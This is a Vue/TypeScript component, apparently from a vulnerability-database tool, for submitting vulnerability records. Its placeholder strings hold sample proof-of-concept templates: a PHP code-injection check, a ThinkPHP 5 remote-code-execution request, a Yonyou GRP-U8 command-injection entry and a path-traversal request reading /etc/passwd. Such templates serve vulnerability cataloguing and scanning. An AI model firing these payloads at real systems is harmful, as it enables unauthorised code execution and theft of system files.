<template>
    
</template>
<script lang="ts" setup>
    import { ref } from 'vue'
    import { UploadFilled } from '@element-plus/icons-vue'
    import { useRoute } from 'vue-router'
    import { onMounted } from 'vue';
    import { useI18n } from 'vue-i18n';
    import api from '../api'

    const { t } = useI18n()
    const router = useRoute();
    const token = sessionStorage.getItem('token')
    const url = ref('/api/v1/addvuln')
    const poc = ref('xray')
    const exp = ref('xray')
    const vulntype = ref([])
    const mountedFunctions = []//getVulnTypes,checkFrom]
    const xraypoc = `name: poc-yaml-test-php-rce
manual: true
transport: http
set:
  s1: randomInt(100000000, 200000000)
  s2: randomInt(10000, 20000)
rules:
  r0:
    request:
      cache: true
      method: POST
      path: /index.php
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: <?={{s2}}-{{s1}};
    expression: response.status == 200 && response.body_string.contains(string(s2 - s1))
expression: r0()
detail:
  author: test
  links:
    - https://test.com`
    const nucleitemp = `id: thinkphp-5022-rce

info:
  name: ThinkPHP - Remote Code Execution
  author: dr_set
  severity: critical
  description: ThinkPHP 5.0.22 and 5.1.29 are susceptible to remote code execution if the website doesn't have mandatory routing enabled, which is the default setting. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
  reference: https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5-rce
  metadata:
    max-request: 1
  tags: thinkphp,rce

http:
  - method: GET
    path:
      - "{{BaseURL}}?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "PHP Extension"
          - "PHP Version"
          - "ThinkPHP"
        condition: and

      - type: status
        status:
          - 200

# digest: 4b0a00483046022100ee65575ab1901e3f23b7c1891b8a08b0b6e5593256533a8450d227df88ab679d022100920cc2dba8c2ffb1ae53faa6ff927fe673b15ef8d2326504825b870f6d398cd5:922c64590222798bb761d5b6d8e72950`
    const gobypoc = `{
  "Name": "Yonyou GRP-U8 RCE with SQLi",
  "Description": "用友GRP-U8行政事业财务管理软件是用友公司专注于国家电子政务事业，基于云计算技术所推出的新一代产品。当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。",
  "Product": "Yonyou-GRP-U8",
  "Homepage": "https://www.yonyou.com/",
  "DisclosureDate": "2020-09-11",
  "Author": "itardc@163.com",
  "FofaQuery": "app=\"Yonyou-GRP-U8\"",
  "Level": "3",
  "Impact": "当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击",
  "Recommendation": "官方已发布针对此漏洞的修复补丁。",
  "References": [
    "https://nosec.org/home/detail/4561.html"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "cmd",
      "type": "input",
      "value": "whoami"
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": null,
  "ExploitSteps": null,
  "Tags": ["rce", "sqli"],
  "CVEIDs": null,
  "CVSSScore": null,
  "AttackSurfaces": {
    "Application": ["Yonyou-GRP-U8"],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`
    const otherpoc = `POST /v1/app/readFileSync HTTP/1.1
Host: {{Host}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://<IP>:<Port>
contentType: application/json
Content-Type: text/plain;charset=UTF-8
Content-Length: 48
Origin: http://<IP>:<Port>
Connection: close

["file:/../../../../../../etc/passwd","utf-8"]`
    const pocplaceholder = ref(xraypoc)
    const expplaceholder = ref(xraypoc)
    const vulnlevel = ref('--')
    const form = ref({
        vuln_name: '',
        vuln_type_id: 1,
        cvss: 0.1,
        vuln_level: '',
        cve: '',
        nvd: '',
        edb: '',
        cnnvd: '',
        cnvd: '',
        affected_product: '',
        repair_suggestion: '',
        poc: '',
        exp: '',
        poc_type: poc.value,
        exp_type: exp.value,
        is_public: false,
        description: '',
        fofa_query: '',
        zoom_eye_query: '',
        quake_query: '',
        hunter_query: '',
        google_query: '',
        shodan_query: '',
        censys_query: '',
        greynoise_query: '',
        attachment_id: '',
        affected_product_version: '',
    })
    
    onMounted(() => {
        mountedFunctions.forEach(fn => {
            fn();
        });
    });
    function checkFrom () {
        const id = router.query.id
        if (router.redirectedFrom.path === '/myvulns') {
            const data = JSON.parse(localStorage.getItem('form'))
            if (data.id === id) {
                form.value = data
                url.value = '/api/v1/editvuln'
            }
        } else {
            localStorage.removeItem('form')
        }
    }
    async function getVulnTypes() {
        try {
            const response = await api.get('/api/v1/getvulntypes')
            vulntype.value = response.data.data
        } catch (error) {
            //console.error(error)
        }
    }
    
    const ShowVlunLevel = () => {
        form.value.cvss = Number(form.value.cvss)
        if (form.value.cvss > 0 && form.value.cvss < 4) {
            form.value.vuln_level = 'Low'
            vulnlevel.value = t('app.webui.low')
            return
        } else if (form.value.cvss >= 4 && form.value.cvss < 7) {
            form.value.vuln_level = 'Medium'
            vulnlevel.value = t('app.webui.medium')
            return
        } else if (form.value.cvss >= 7 && form.value.cvss < 9) {
            form.value.vuln_level = 'High'
            vulnlevel.value = t('app.webui.high')
            return
        } else if (form.value.cvss >= 9 && form.value.cvss <= 10) {
            form.value.vuln_level = 'Critical'
            vulnlevel.value = t('app.webui.critical')
            return
        } else {
            ElMessage.error(t('app.webui.cvsserror'))
        }
    }
    const ShowPocInput = () => {
        form.value.poc_type = poc.value
        if (poc.value == 'xray') {
            pocplaceholder.value = xraypoc
        } else if (poc.value == 'nuclei') {
            pocplaceholder.value = nucleitemp
        } else if (poc.value == 'goby') {
            pocplaceholder.value = gobypoc
        } else {
            pocplaceholder.value = otherpoc
        }
    }

    const ShowExpInput = () => {
        form.value.exp_type = exp.value
        if (exp.value == 'xray') {
            expplaceholder.value = xraypoc
        } else if (exp.value == 'nuclei') {
            expplaceholder.value = nucleitemp
        } else if (exp.value == 'goby') {
            expplaceholder.value = gobypoc
        } else {
            expplaceholder.value = otherpoc
        }
    }

    const submitSuccess = () => {
        ElMessageBox.confirm(
            t('app.webui.submitsuccessnotice'),
            t('app.webui.submitsuccess'),
            {
                confirmButtonText: t('el.datepicker.confirm'),
                cancelButtonText: t('el.datepicker.cancel'),
                type: 'success',
            }
        )
        .then(() => {
            router.push('/')
        })
        .catch(() => {
            location.reload()
        })
    }
    
    const handleSuccess = (response) => {
        //console.log(response.file_id)
        form.value.attachment_id = response.file_id
    }
    const handleRemove = async () => {
        //console.log("删除文件")
        try {
            const config = {
                headers: {
                    'Authorization': `Bearer ${token}`  // 使用Bearer schema
                }
            };
            const response = await api.get('/delete/file?id=' + form.value.attachment_id, config)
            form.value.attachment_id = ''
        } catch (error) {
            // 处理请求错误
            //console.error(error);
        }
    }
    const onSubmit = async () => {
        //console.log(form.value)
        try {
            const config = {
                headers: {
                    'Authorization': `Bearer ${token}`  // 使用Bearer schema
                }
            };
            const response = await api.post(url.value, form.value, config)
            if (response.data.code == 0) {
                sessionStorage.removeItem('token')
                sessionStorage.removeItem('username')
                sessionStorage.removeItem('avatar')
                location.reload()
            } else if (response.data.code == 1) {
                submitSuccess()
            } else {
                ElMessage.error(t('app.webui.submitfailnotice'))
            }
        } catch (error) {
            // 处理请求错误
            console.error(error);
        }
    }
</script>
<style scoped>
</style>